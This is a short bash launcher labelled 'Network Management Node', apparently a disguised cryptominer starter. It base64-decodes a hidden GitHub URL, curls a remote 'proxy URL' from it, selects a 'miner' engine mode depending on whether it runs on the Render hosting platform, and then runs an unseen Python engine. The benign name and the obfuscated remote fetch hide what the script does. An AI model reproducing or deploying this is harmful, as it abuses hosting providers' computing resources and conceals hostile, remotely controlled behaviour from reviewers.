#!/bin/bash
# Network Management Node

# GitHub'dan Proxy URL'sini çöz [cite: 1]
CONF_U="$(echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0V4bWEwL3djL3JlZnMvaGVhZHMvbWFpbi91cmw=' | base64 -d)"
DYN_URL=$(curl -sL "$CONF_U" | tr -d '\n\r\t ')

export PROXY_URL="${DYN_URL}"

# Render ortamı kontrolü
if [[ -n "${RENDER_EXTERNAL_HOSTNAME}" ]]; then
    export ENGINE_MODE="all"
else
    export ENGINE_MODE="miner"
fi

export PYTHONUNBUFFERED=1
exec python3 /engine.py
